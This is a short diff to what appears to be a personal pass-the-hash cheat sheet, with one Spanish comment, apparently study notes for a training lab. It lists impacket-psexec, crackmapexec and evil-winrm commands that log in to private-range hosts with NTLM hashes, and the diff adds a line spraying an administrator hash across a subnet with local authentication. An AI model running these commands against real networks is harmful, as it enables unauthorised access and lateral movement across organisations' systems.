@@ -33,6 +33,9 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 #####Crackmapexec:
 crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
+tambien podemos buscarlo con local accounts:
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+
 #####Evil-winRM:
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
